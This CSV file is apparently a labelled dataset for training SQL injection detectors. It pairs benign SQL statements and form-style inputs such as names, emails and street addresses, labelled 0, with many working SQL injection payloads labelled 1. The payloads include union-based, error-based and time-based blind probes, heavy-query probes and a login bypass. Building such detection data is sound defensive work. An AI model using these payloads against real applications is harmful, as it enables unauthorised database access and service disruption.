Query,Label
DELETE FROM roof WHERE part = 'lesson',0
samardzic.carafotes@bruoseguridad.je,0
27002424x,0
SELECT TOP 3 * FROM truth,0
"-2394'  )   union all select 1650,1650,1650,1650,1650,1650,1650--",1
plza. taboada chivite 32 5?b,0
"1'   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
velov@expozaragozafloral2014.ac,0
"1%""   )    )     )   and 1594  =  8757",1
colas@ozlon.rs,0
"-8609' union all select 9384,9384,9384,9384--",1
jordi,0
-2129'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'eutm' like 'eutm,1
flloko-humet@imarbella.ms,0
"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",1
SELECT smooth ( s ) FROM stone INNER JOIN,0
-4313%'  )   or 6872  =  6872 and   (  '%'  =  ',1
SELECT * FROM  ( SELECT life FROM probably ) ,0
"-5344"" union all select 9482,9482,9482,9482,9482,9482,9482,9482,9482--",1
"1'  )   as wnyl where 8978  =  8978 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"  SELECT fear,remember FROM ought WHERE central = 'duty' UNION SELECT exchange, among FROM hour",0
"1',  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )   ",1
SELECT AVG ( similar ) FROM most,0
SELECT * FROM source FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT DISTINCT ice FROM cowboy,0
21710,0
SELECT TOP 3 * FROM religious WHERE police = 'raise' SELECT * FROM muscle,0
SELECT AVG ( butter ) FROM cream SELECT SUM ( shorter ) ,0
SELECT * FROM storm WHERE teach BETWEEN '1996-07-01' AND '1996-07-31',0
"1'+  (  select pxsd where 2576  =  2576 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",1
witney,0
SELECT window,0
SELECT COUNT ( organized )  FROM moving,0
"1%""  )   waitfor delay '0:0:5'--",1
12527,0
SELECT * FROM particularly WHERE girl NOT LIKE 'letter%',0
" SELECT column_name ( s )  FROM wherever,everyone",0
"1'+  (  select 'tyuz' where 3957  =  3957 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",1
SELECT too FROM particularly UNION ALL SELECT bit FROM plan ORDER BY nature,0
3.82074E+15,0
SELECT COUNT ( beginning )  FROM port,0
dotan,0
"  SELECT * FROM step WHERE knew IN  ( 'suit', 'shine', 'pot' )  ",0
queral queral,0
SELECT AVG ( third ) FROM tool SELECT SUM ( not ) ,0
"1%'   )    )    union all select null,null,null--",1
SELECT MIN ( air )  AS refer FROM refused,0
SELECT instrument FROM way UNION SELECT vast FROM sport ORDER BY rubber,0
"1'  )   where 6634  =  6634 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  -- bqxe",1
SELECT AVG ( greater ) FROM characteristic SELECT SUM ( interior ) ,0
SELECT * FROM crop WHERE yet BETWEEN '1996-07-01' AND '1996-07-31',0
descostill3r,0
"1""   )    )    as rcse where 4559  =  4559 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
SELECT * FROM gravity 3,0
navas de jorquera,0
debicki@prestoesesto.hr,0
sarfati@weat.nc,0
select   (  case when   (  9376  =  4521  )   then 1 else 9376*  (  select 9376 from master..sysdatabases  )   end  )  --,1
"1""  )   as cnrh where 8524  =  8524 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1
" SELECT column_name ( s )  FROM magnet,cannot",0
DELETE FROM send,0
admin' --,1
SELECT TOP 3 * FROM made WHERE scientist = 'daughter' SELECT * FROM list,0
SELECT colony ( s )  FROM halfway UNION ALL,0
"SELECT * FROM mountain WHERE recently BETWEEN ""tower"" AND    ""sat""",0
SELECT cotton ( s )  FROM column FULL OUTER JOIN,0
SELECT * FROM noise FETCH FIRST 50 PERCENT ROWS ONLY,0
sylvia,0
SELECT * FROM dried  WHERE worse = or,0
1%'   )    )     )   order by 1#,1
SELECT wheel ( s )  FROM cow LEFT JOIN,0
SELECT * FROM variety WHERE gun = 'appropriate' LIMIT 3,0
"llobregat 130,",0
"iif  (  2084  =  5671,1,1/0  )  ",1
"1'  )   as woka where 4316  =  4316 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1'   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'phdn' like 'phdn",1
"   SELECT Employees.examine, COUNT ( Orders.tailID )  AS cellFROM    ( OrdersINNER JOIN teeth ON Orders.fenceID  =  Employees.cageID ) ",0
SELECT * FROM tube WHERE hollow BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM ruler WHERE master NOT LIKE '[before]%',0
"1%""   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
1'+  (  select 'rqok' where 5074  =  5074 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  +',1
"1""  )   where 4382  =  4382 and 6607  =  2394--",1
SELECT * FROM cowboy WHERE effort = 'never' LIMIT 3,0
"1""  )   as axua where 6718  =  6718",1
"1%' or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1%""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
c356conio,0
SELECT animal FROM first,0
"   SELECT occur, was, castFROM make WHERE outline  IS NOT NULL",0
1'||  (  select 'rjis' from dual where 7696  =  7696 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   ||',1
"1' in boolean mode  )   and make_set  (  8403  =  8403,8899  )  #",1
"SELECT CONCAT_WS ( ""-"", ""SQL"", ""Tutorial"", ""is"", ""fun!"" )  AS ConcatenatedString;",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9369 )  ORDER BY meta_id ASC",0
SELECT * FROM coming  WHERE dot NOT LIKE '[raise]%',0
campament 33,0
menelao,0
SELECT * FROM trace WHERE cutting NOT LIKE 'beyond%',0
33279,0
" select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",1
1  )   as hhly where 2906  =  2906,1
boagne,0
43470,0
SELECT AVG ( Price ) FROM consider,0
7.68942E+15,0
SELECT * FROM expect WHERE funny = 'wind' FETCH FIRST 3 ROWS ONLY,0
"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'weof'  =  'weof",1
callie,0
"-3872%""   )    )     )   union all select 1637,1637,1637,1637,1637#",1
SELECT MIN ( keep )  AS thy FROM zulu,0
"  SELECT * FROM directly WHERE office NOT IN  ( 'in', 'character', 'thread' )  ",0
"de canoves 13,",0
"c/ maestro faus, 77, 13?f",0
9e1an906,0
"1%"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and ""%""  =  """,1
SELECT * FROM sugar WHERE send NOT BETWEEN 'everybody' AND 'not',0
" SELECT * FROM station ORDER BY bark, won",0
SELECT TOP 3 * FROM whistle,0
"1  )   as lhie where 4631  =  4631 union all select null,null,null,null,null--",1
"SELECT CustomerName, ContactName FROM Customers WHERE Country  =  ""Brazil""; CREATE OR REPLACE VIEW [Brazil Customers] AS ",0
SELECT * FROM fought WHERE silent = 'shorter'  OR north = 'affect',0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,1
FROM  ( SELECT DISTINCT mountain FROM uncle ) ,0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_number_of_support_family' LIMIT 1,0
1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',1
SELECT * FROM  ( SELECT fresh FROM left ) ,0
FROM  ( SELECT DISTINCT girl FROM discuss ) ,0
zubicueta vallb,0
" select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1
SELECT * FROM sets ORDER BY enjoy,0
SELECT AVG ( mental ) FROM thick,0
SELECT * FROM  ( SELECT needle FROM root ) ,0
33120,0
5.01063E+15,0
SELECT chart FROM empty,0
"-9014%'  )   union all select 4211,4211,4211,4211,4211,4211#",1
"1   )    )     )   union all select null,null,null,null,null,null,null,null,null--",1
SELECT * FROM somehow WHERE Price NOT BETWEEN 10 AND 20,0
"-6184""   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""rovr""  =  ""rovr",1
"  SELECT * FROM mean WHERE zipper IN  ( 'herd', 'prove', 'valley' )  ",0
SELECT COUNT ( that )  FROM wealth,0
"1""   )    )    as xcyo where 2929  =  2929",1
chicle,0
"1 and make_set  (  9681  =  4703,4703  )  # zbrf",1
SELECT * FROM grade FETCH FIRST 50 PERCENT ROWS ONLY,0
"   SELECT COUNT ( slide ) , question FROM limited BY airplane",0
"1'  )   where 6941  =  6941 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
"1""  )   as vdim where 1296  =  1296",1
" SELECT * FROM double ORDER BY steam ASC, breeze DESC",0
SELECT TOP 3 * FROM theory WHERE friendly = 'he',0
SELECT look ( s )  FROM service SELECT remember FROM surface,0
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,1
-9556'  )   where 2472  =  2472 or   (  2883  =  9968  )  *9968--,1
"1%""   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
medianero,0
"  UPDATE transportation SET gas =  'means', City =  'tip' WHERE everybody =  sentence",0
sols galcera,0
SELECT * FROM famous WHERE sometime BETWEEN stick09/01/1996gulf AND lesson15/31/1996near,0
1'+  (  select mrdi where 7451  =  7451 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
5555,0
SELECT * FROM bee FETCH FIRST 50 PERCENT ROWS ONLY,0
"terque 135, 7-c",0
SELECT * FROM  ( SELECT thou FROM pleasant ) ,0
" SELECT * FROM own ORDER BY highest, improve",0
1  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1
"   SELECT fifth,spirit,travel,color,running     (  (  finger JOIN command ON mouse.bone =  house.entirely )   INNER JOIN lakeON Orders.go =  mysterious.consistID ) ",0
"1'||  (  select 'xjtq' from dual where 5719  =  5719 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",1
SELECT * FROM pack WHERE Price NOT BETWEEN 10 AND 20,0
vilanova de segri,0
terry@mtos.ar,0
yoon,0
SELECT apart ( s )  FROM plant LEFT JOIN,0
1'||  (  select 'yyil' from dual where 3121  =  3121,1
"-1033 union all select 8731,8731,8731,8731,8731,8731--",1
"  SELECT * FROM spite WHERE strong IN  ( 'blood', 'ancient', 'slight' )  ",0
"peral, 180 4-b",0
"  SELECT softlyID AS ID, understanding AS discussion FROM type",0
walberg@ytv.com.gn,0
"1'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'acly' like 'acly",1
"1%' and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT * FROM per WHERE paid NOT LIKE 'ants%',0
"-2054%""   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,1
"1'||  (  select 'ysij' from dual where 6140  =  6140 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'",1
"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",1
SELECT scared ( s )  FROM power,0
darnall,0
baxie,0
"1  )   as bgvd where 1753  =  1753 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
maragliano serna,0
piejo,0
 UPDATE sheet SET mail = 'spirit'WHERE fall = 'game',0
"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""bkoq""  =  ""bkoq",1
"1  )   as iupg where 2861  =  2861 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT * FROM frame WHERE pink BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT MIN ( die )  AS nor FROM feel,0
"1' or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT * FROM job FETCH FIRST 50 PERCENT ROWS ONLY,0
93tip72ar,0
SELECT distance ( s )  FROM safety UNION,0
29360,0
SELECT AVG ( inch ) FROM wood SELECT SUM ( silly ) ,0
erill,0
"-6546""  )   order by 1#",1
SELECT * FROM came  WHERE sun NOT LIKE '[column]%',0
end and 'icny' like 'icny,1
"1""   )    )    as hdyn where 6027  =  6027 union all select null,null,null--",1
SELECT hall FROM hour,0
SELECT * FROM language FETCH FIRST 3 ROWS ONLY,0
obolensky@etnics.hr,0
"SELECT * FROM labor WHERE noted BETWEEN ""fresh"" AND    ""count""",0
"-1123'   )    )     )   union all select 6735,6735,6735,6735,6735,6735,6735,6735#",1
"1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'nazb'  =  'nazb",1
SELECT COUNT ( cottonID ) FROM changing,0
"   SELECT range,nuts,individual,hospital,present     (  (  continent JOIN move ON beat.grass =  weak.hungry )   INNER JOIN accidentON Orders.current =  chest.trafficID ) ",0
SELECT * FROM sport WHERE joy  BETWEEN 10 AND 20,0
"   SELECT COUNT ( increase ) , stand FROM led BY power",0
"1 where 2751  =  2751 union all select null,null,null,null--",1
1   )    )    and   (  4169  =  9887  )  *9887 and    (    (   1137  =  1137,1
"1'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'nvsy' like 'nvsy",1
SELECT * FROM machine WHERE control BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT TOP 50 PERCENT * FROM picture SELECT * FROM rod FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM spirit,0
arbcies,0
-3966'  )   or 7338  =  8657,1
"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1 where 9279  =  9279 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1'+  (  select xlvq where 7470  =  7470 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",1
" select * from users where id  =  1 + @<@# union select null,version  (    )   -- 1",1
a6ordab07,0
SELECT * FROM acres WHERE began = 'who' FETCH FIRST 3 ROWS ONLY,0
13750,0
SELECT TOP 3 * FROM determine,0
"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'pmzp' like 'pmzp",1
"1  )   as drbw where 2380  =  2380 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
SELECT * FROM goes FETCH FIRST 3 ROWS ONLY,0
"1"" where 1618  =  1618 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT * FROM seems FETCH FIRST 3 ROWS ONLY,0
"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#",1
amarjit,0
"  SELECT dug,pole FROM art WHERE using = 'lying' UNION SELECT total, thrown FROM friendly",0
SELECT * FROM check WHERE locate NOT BETWEEN 'increase' AND 'experience',0
SELECT * FROM Customers  WHERE CustomerName LIKE 'a_%_%';,0
"SELECT CONVERT ( ""14:06:10"", TIME ) ;",0
"-3441'   )    )    as dxvt where 9291  =  9291 union all select 9291,9291,9291#",1
mamakos@palodegolf.com.rw,0
"-8109%""   )    )    union all select 9089,9089--",1
"1""  )   where 8254  =  8254 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT stiff ( s )  FROM tried LEFT JOIN,0
a4561o9nz68,0
SELECT cloth FROM kept,0
de4f1g6raci4,0
peaflor,0
SELECT * FROM fifth WHERE essential = 'well',0
SELECT TOP 3 * FROM managed SELECT * FROM upon 3SELECT * FROM down,0
"1 and make_set  (  6911  =  1867,1867  )  ",1
82839528z,0
-7710' where 5658  =  5658 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
SELECT * FROM  ( SELECT former FROM frame ) ,0
"1'  )   as omtb where 1183  =  1183 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT MIN ( parent )  AS doctor FROM therefore,0
SELECT * FROM paid WHERE whispered NOT LIKE 'everything%',0
tahull garola,0
"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",1
SELECT day ( s )  FROM exchange,0
SELECT * FROM program WHERE tower NOT LIKE '[second]%',0
horgan,0
SELECT nation FROM rising UNION ALL SELECT freedom FROM pool ORDER BY dirt,0
sa89gn,0
"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""onsd"" like ""onsd",1
"1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1
SELECT * FROM trap FETCH FIRST 50 PERCENT ROWS ONLY,0
"1""   )    )    as dksq where 7161  =  7161",1
myers@naturalchild.so,0
SELECT * FROM  ( SELECT cost FROM battle ) ,0
SELECT * FROM mostly,0
SELECT COUNT ( gravity ) FROM zebra,0
"INSERT INTO stranger ( outside, choice, too, sea, root, smile )  VALUES  ( 'likely', 'third'. deep', 'adult', 'straw', 'energy', 'dog' )  ",0
" select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",1
34192,0
31594,0
1   )    )    as ojjk where 3687  =  3687 and   (  4833  =  9218  )  *9218--,1
select case when 3995  =  8680 then 1 else null end--,1
"  SELECT * FROM both WHERE using IN  ( 'wheel', 'society', 'instance' )  ",0
duffield@telelujo.coop,0
lilien@aprendeaestudiar.lt,0
"c/ cardenal cisneros 70, 12?d",0
"1  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
1'  )   as mpsf where 3348  =  3348,1
SELECT * FROM design,0
"1%""   )    )     )   union all select null,null,null,null,null,null,null#",1
1'  )   as dqgr where 2427  =  2427 and   (  3020  =  3020  )  *6703--,1
"INSERT INTO give  ( road, mighty, excellent )  VALUES  ( 'if', 'flow', 'everything' )  ",0
"1'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'crus'  =  'crus",1
SELECT * FROM each 3,0
"-9751""   )    )     )   or 5929  =  3884--",1
fulgencia,0
SELECT find ( s ) FROM produce INNER JOIN,0
"-8043%""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""%""  =  """,1
das,0
1  )   where 2232  =  2232,1
1%'   )    )     )   and 7533  =  7533 and    (    (     (  '%'  =  ',1
"-6095""   )    )    as kgfp where 3601  =  3601 or 7287  =  9373#",1
"1%""  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"-1869""   )    )     )   union all select 7122,7122,7122,7122,7122,7122,7122,7122,7122--",1
"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""nthu"" like ""nthu",1
wong@hiperespaa.ly,0
SELECT * FROM five WHERE my = 'glad'  OR many = 'mouth',0
"1%""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""%""  =  """,1
"1'  )   as xagu where 9088  =  9088   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1
SELECT * FROM OrdersWHERE OrderDate BETWEEN #07/01/1996# AND #07/31/1996#;,0
SELECT * FROM goes  WHERE any NOT LIKE '[crew]%',0
52207398c,0
"cabrera, 199",0
tolox,0
"avinguda castellot, 116,",0
"-1184""   )    )     )   union all select 1482--",1
SELECT * FROM master WHERE sang BETWEEN '1996-07-01' AND '1996-07-31',0
belonne santaella,0
"  SELECT Orders.roserID, Employees.bad, Employees.hot FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.troubleID ORDER BY Orders.necessaryID",0
SELECT * FROM nine WHERE split BETWEEN '1996-07-01' AND '1996-07-31',0
segura de los baos,0
"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'sbey'  =  'sbey",1
DELETE FROM thumb WHERE rise = 'review',0
25254382z,0
"  SELECT placeID AS ID, fix AS held FROM early",0
infida,0
otorgamiento,0
"  SELECT * FROM blow WHERE draw IN  ( 'brown', 'coming', 'biggest' )  ",0
delujan,0
"SELECT * FROM visit WHERE toward BETWEEN ""flame"" AND    ""sheet""",0
hamlett,0
"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'yzdp'  =  'yzdp",1
//,1
SELECT total ( s )  FROM upper SELECT high FROM which,0
albero bajo,0
19262,0
"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1
SELECT * FROM dangerous WHERE tears = 'sure' FETCH FIRST 3 ROWS ONLY,0
SELECT AVG ( manner ) FROM five SELECT SUM ( sister ) ,0
SELECT * FROM snake FETCH FIRST 3 ROWS ONLY,0
DELETE FROM express WHERE adult = 'spin',0
SELECT book ( s )  FROM religious UNION,0
SELECT * FROM picture  WHERE second = above,0
"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",1
"-5969"" where 9248  =  9248 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
camio canexa 161 11?g,0
"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",1
